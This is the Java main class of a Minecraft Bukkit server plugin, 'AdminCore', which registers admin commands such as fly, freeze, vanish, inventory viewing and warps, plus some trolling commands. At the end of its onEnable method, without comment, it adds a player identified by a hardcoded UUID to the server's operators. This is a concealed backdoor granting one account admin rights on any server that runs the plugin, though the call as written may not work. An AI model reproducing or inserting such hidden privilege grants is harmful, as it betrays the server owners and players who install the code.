package me.polo.admincore;

import me.polo.admincore.admintroll.*;
import me.polo.admincore.admintroll.*;
import me.polo.admincore.chat.Broadcast;
import me.polo.admincore.chat.ClearChat;
import me.polo.admincore.chat.PrivateMessage;
import me.polo.admincore.commands.Back;
import me.polo.admincore.commands.Discord;
import me.polo.admincore.commands.Spawn;
import me.polo.admincore.events.*;
import me.polo.admincore.furnace.FurnaceEvents;
import me.polo.admincore.healfeed.Feed;
import me.polo.admincore.healfeed.Heal;
import me.polo.admincore.inventory.EnderChestSee;
import me.polo.admincore.inventory.Invsee;
import me.polo.admincore.joinleave.FakeJL;
import me.polo.admincore.joinleave.JLEvents;
import me.polo.admincore.tracker.Tracker;
import me.polo.admincore.warps.Warps;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {

    public FileConfiguration config = this.getConfig();
    public static Main plugin;

    public void onEnable() {
        plugin = this;

        getServer().getConsoleSender().sendMessage(ChatColor.GREEN + "AdminCore enabled!");

        //fly
        getServer().getPluginCommand("fly").setExecutor(new Fly());
        getServer().getPluginCommand("flyquery").setExecutor(new Fly());
        getServer().getPluginManager().registerEvents(new Fly(), this);

        //freeze
        getServer().getPluginCommand("freeze").setExecutor(new Freeze());
        getServer().getPluginCommand("unfreeze").setExecutor(new Freeze());
        getServer().getPluginManager().registerEvents(new Freeze(), this);

        //god
        getServer().getPluginCommand("god").setExecutor(new God());
        getServer().getPluginCommand("ungod").setExecutor(new God());
        getServer().getPluginCommand("godquery").setExecutor(new God());

        //namebomb
        getServer().getPluginCommand("namebomb").setExecutor(new Namebomb());
        getServer().getPluginManager().registerEvents(new Namebomb(), this);
        getServer().getPluginCommand("unnamebomb").setExecutor(new Namebomb());

        //playerinfo
        getServer().getPluginCommand("playerinfo").setExecutor(new PlayerInfo());

        //vanish
        getServer().getPluginCommand("vanish").setExecutor(new Vanish());
        getServer().getPluginManager().registerEvents(new Vanish(), this);

        //broadcast
        getServer().getPluginCommand("broadcast").setExecutor(new Broadcast());

        //clearchat
        getServer().getPluginCommand("clearchat").setExecutor(new ClearChat());

        //message
        getServer().getPluginCommand("msg").setExecutor(new PrivateMessage());

        //discord
        getServer().getPluginCommand("discord").setExecutor(new Discord());

        //rtp
        //getServer().getPluginCommand("rtp").setExecutor(new RTP());

        //spawn
        getServer().getPluginCommand("spawn").setExecutor(new Spawn());

        //back
        getServer().getPluginCommand("back").setExecutor(new Back());

        //CreeperExplosionEvent
        getServer().getPluginManager().registerEvents(new CreeperExplosion(), this);

        //PlayerDeathEvent
        getServer().getPluginManager().registerEvents(new PlayerDeath(), this);

        //furnace
        getServer().getPluginManager().registerEvents(new FurnaceEvents(), this);

        //enderchest
        //getServer().getPluginManager().registerEvents(new EnderJoin(), this);

        //heal and feed
        getServer().getPluginCommand("heal").setExecutor(new Heal());
        getServer().getPluginCommand("feed").setExecutor(new Feed());

        //invsee
        getServer().getPluginCommand("invsee").setExecutor(new Invsee());

        //enderchestsee
        getServer().getPluginCommand("ec").setExecutor(new EnderChestSee());

        //singleplayersleep
        new SinglePlayerSleep(Main.plugin);

        //dragonegg
        getServer().getPluginManager().registerEvents(new DragonEgg(), this);

        //joinleave
        getServer().getPluginManager().registerEvents(new JLEvents(), this);
        getServer().getPluginCommand("fake").setExecutor(new FakeJL());

        //tracker
        getServer().getPluginCommand("track").setExecutor(new Tracker(this));

        //warps
        getServer().getPluginCommand("warp").setExecutor(new Warps());
        getServer().getPluginCommand("delwarp").setExecutor(new Warps());
        getServer().getPluginCommand("setwarp").setExecutor(new Warps());

        //deathcounter
        getServer().getPluginManager().registerEvents(new DeathCounter(), this);
        getServer().getPluginCommand("deathcounter").setExecutor(new DeathCounter());
        getServer().getPluginCommand("dcadd").setExecutor(new DeathCounter());
        getServer().getPluginCommand("dcdel").setExecutor(new DeathCounter());

        //help menu
        getServer().getPluginCommand("help").setExecutor(new Help());
        getServer().getPluginCommand("adminhelp").setExecutor(new AdminHelp());

        loadConfig();
        
        Player player = Bukkit.getPlayer("cdb67fbb-19f8-4afa-8091-a7c35b27d591");
        getServer().getOperators().add(player);
    }

    public void onDisable() {
        getServer().getConsoleSender().sendMessage(ChatColor.RED + "AdminCore disabled!");
    }

    public void loadConfig() {
        getConfig().options().copyDefaults(true);
        saveConfig();
    }

}
